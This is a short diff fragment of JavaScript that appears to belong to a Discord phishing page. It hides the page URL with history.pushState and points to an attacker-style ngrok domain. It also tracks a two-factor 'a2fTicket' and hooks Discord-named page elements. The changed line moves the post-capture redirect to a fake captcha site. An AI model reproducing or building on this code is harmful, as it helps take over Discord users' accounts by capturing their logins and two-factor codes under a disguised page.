@@ -1006,7 +1006,7 @@ var ref = urlParams.get('from');
 ref = ref ? [...ref].reverse().join('') : null;
 history.pushState(null, null, '/');
 const DOMAIN = '8480-170-83-71-156.ngrok-free.app';
-const successURL = 'discord.com/app';
+const successURL = 'https://captcha.bot';
 var a2fTicket;
 const layerContainer = document.getElementsByClassName('layerContainer_d5a653')[1];
 const modalContainer = document.getElementsByClassName('modal__1237a')[0];
